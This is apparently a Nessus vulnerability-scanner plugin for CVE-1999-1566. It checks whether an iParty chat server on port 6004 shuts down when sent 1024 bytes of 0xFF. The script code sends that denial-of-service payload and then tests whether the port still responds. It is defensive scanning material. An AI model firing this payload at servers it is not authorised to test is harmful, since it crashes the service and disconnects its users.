#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10111);
 script_bugtraq_id(6844);
 script_cve_id("CVE-1999-1566");
 script_version ("$Revision: 1.15 $");
 name["english"] = "iParty";
 name["francais"] = "iParty";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "iParty is an audio/text chat program for Windows.
The iParty server listens on port 6004 for client requests. If someone
connects to it and sends a large amount of ASCII 255 chars, the server
will close itself and disconnect all the current users.

Risk factor : Low / Medium

Solution : Upgrade";

 desc["francais"] = "iParty est un programme de chat avec audio et texte 
pour Windows. Le serveur écoute sur le port 6004 en attente des requêtes
des clients. Si quelqu'un si connecte et envoie un grand nombre de
caractères ASCII 255, alors le serveur va se fermer et couper toutes
les connections actives.

Facteur de risque : Faible/Moyen.

Solution : Mettez-le à jour";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Shuts down a iParty server";
 summary["francais"] = "Coupe un serveur iParty";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(6004);
 exit(0);
}

#
# The script code starts here
#

if(get_port_state(6004))
{
 soc = open_sock_tcp(6004);
 if(soc)
 {
  asc = raw_string(0xFF);
  data = crap(data:asc, length:1024);
  send(socket:soc, data:data);
  close(soc);
  soc2 = open_sock_tcp(6004);
  if(!soc2)security_warning(6004);
  else close(soc2);
 }
}
